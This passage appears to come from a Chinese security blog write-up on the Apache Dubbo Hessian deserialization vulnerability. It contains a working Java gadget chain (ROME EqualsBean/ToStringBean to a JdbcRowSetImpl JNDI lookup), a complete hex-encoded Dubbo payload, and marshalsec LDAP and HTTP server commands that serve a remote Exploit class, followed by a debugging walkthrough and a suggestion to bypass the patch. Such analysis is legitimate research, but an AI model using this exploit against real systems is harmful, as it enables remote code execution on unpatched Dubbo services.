    - ToStringBean.toString
    - JdbcRowSetImpl.getDatabaseMetaData
    - JdbcRowSetImpl.connect
    - Context.lookup
分析攻击链构造过程，这里参考了 原作者的利用链 https://www.mail-archive.com/PI:EMAIL/msg06544.html
，作者以及写的很完整了，我这里搬过来整合了一下。利用了marshalsec jar包，
    import com.caucho.hessian.io.Hessian2Output;
    import com.rometools.rome.feed.impl.EqualsBean;
    import com.rometools.rome.feed.impl.ToStringBean;
    import com.sun.rowset.JdbcRowSetImpl;
    import marshalsec.Hessian;
    import marshalsec.gadgets.JDKUtil;
    import java.io.ByteArrayOutputStream;
    public class GadgetsTestHessian {
        private static Object getPayload() throws Exception {
            String jndiUrl = "ldap://127.0.0.1:8087/Exploit";;//最后触发JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
            ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,
                    JDKUtil.makeJNDIRowSet(jndiUrl));//EqualsBean.beanHashCode调用ToStringBean.toString
            EqualsBean root = new EqualsBean(ToStringBean.class,item);//HashMap.hash调用EqualsBean.beanHashCode
            return JDKUtil.makeMap(root,root);//触发HashMap.put->HashMap.putVal->HashMap.hash
        }
        public static void main(String[] args) throws Exception {
            Object o=getPayload();
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            Hessian2Output output = new Hessian2Output(os);
            output.writeObject(o);
            output.close();
            System.out.println(os.toString());
        }
    }
这个是Hessian 序列化之后的数据，想要利用起来还要封装一层Dubbo协议，我们采用dubbo-spring-boot项目中的DubboAutoConfigurationConsumerBootstrap类进行构造。这里注意一点如果使用Dubbo的消费者和提供者协议Dubbo会自动Hessian序列化传输的对象，所以下面构造Payload只需将利用编写好之后调用Dubbo协议调用即可。
###  0x3 构造Payload
在DemoService.java中添加commonTest 接口函数
在DubboAutoConfigurationConsumerBootstrap中编写消费者调用函数
在DubboAutoConfigurationProviderBootstrap中编写服务者提供的服务，触发连不在这里所以可以随便写。
在Intellij idea中启动provider服务者，然后运行consumer消费者，利用wireshark获取Apache Dubbo
反序列化payload
    dabbc2000000000000000000000003b705322e302e3230366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f5365727669636505312e302e300a636f6d6d6f6e54657374124c6a6176612f6c616e672f4f626a6563743b48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92036f626a096265616e436c61737360433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92036f626a096265616e436c61737361431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac06706172616d73096c697374656e657273036d61700a6368617253747265616d0b617363696953747265616d0d756e69636f646553747265616d0c62696e61727953747265616d0f7374724d61746368436f6c756d6e730d694d61746368436f6c756d6e73057265734d4406726f77734d4402727302707304636f6e6e09666574636853697a650866657463684469720969736f6c6174696f6e1065736361706550726f63657373696e6708726561644f6e6c790b636f6e63757272656e63790c6d61784669656c6453697a65076d6178526f77730c717565727954696d656f75740b73686f7744656c657465640a726f77536574547970650a64617461536f757263650355524c07636f6d6d616e64624d136a6176612e7574696c2e486173687461626c655a4e4e4e4e4e4e56106a6176612e7574696c2e566563746f729a03666f6f4e4e4e4e4e4e4e4e4e56919a8f8f8f8f8f8f8f8f8f8f4e4e4e4e4e90cbe8925454cbf090909046cbec1d6c6461703a2f2f3132372e302e302e313a383038372f4578706c6f69744e4e430f6a6176612e6c616e672e436c61737391046e616d65631d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c633029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e5191519151915a48047061746830366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963651272656d6f74652e6170706c69636174696f6e3024647562626f2d6175746f2d636f6e6669677572652d636f6e73756d65722d73616d706c6509696e7465726661636530366f72672e6170616368652e647562626f2e737072696e672e626f6f742e64656d6f2e636f6e73756d65722e44656d6f536572766963650776657273696f6e05312e302e305a
###  0x4 开启LDAP服务
    ╰─➤  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8089/#Exploit 8087
Exploit.java 代码在很多github都能获取   
然后在Exploit.class 目录中开启HTTPServer
    python -m SimpleHTTPServer 8089
###  0x5 编写python攻击脚本
接下来调试整个漏洞触发链
## 0x05 漏洞调试
触发练如下图所示：
###  0x1 反序列化入口
进入到Dubbo协议的decode环节，其中inputStream是去掉Dubbo协议头的原始数据
在decode函数中会逐步提取Dubbo 协议Body中的内容
in 现在是Hessian2ObjectInput对象，其中包含了要反序列化的二进制内容
在生成反序列化对象时采用的id号是2，从代码中可以看出是Hessian协议。
###  0x2 Dubbo Hessian ReadObject函数
这里是Hessian 反序列化触发链，从Hessian2ObjectInput到Hessian2Input对象
###  0x3 触发readMap函数
在Hessian2Input对象中的readobject方法中调用了readMap函数
注意这里的触发条件是 tag == ‘H’，_buffer是请求的二进制协议数据
###  0x4 触发HashMap.put函数
此时的map为HashMap对象，目前来看一切都在设计之内
###  0x5 触发hashkey.hashCode函数
接着调用了HashMap.hash方法
触发 key.hashCode方法，key为EqualsBean对象
###  0x6 触发EqualsBean.beanHashCode函数
随后出发了toStringBean的Tostring方法
继续跟入，走到了常见的jndi注入利用链
###  0x7 触发JNDI注入利用链
这里利用了toStringBean的Tostring方法中的反射调用
这之后就是以前经常利用的JNDI利用链了
通过调试可以很清楚查看ldap参数的传递和使用过程
在这之后就是远程类加载和执行了，分析到这应该很清楚payload的调用过程了。
## 0x06 漏洞补丁
从补丁对比上分析，发现在反序列化之前进行了方法Dubbo方法名的判断，具体如下。
简单的判断method是否为`$echo` 或者 `$invoke`等，如果方法名称不对的话，在这一步就会死掉，可以尝试下绕过。】  
在高版本JDK中默认TRUST_URL_CODE_BASE为False，且有校验，在jdk8u191以后ldap就不能成功了，低版本的JDK还是可以的。
文章中代码整理到了github上
## 0x07 参考链接
感谢师傅们的博客，学习到了很多~~
https://www.mail-archive.com/PI:EMAIL/msg06544.html  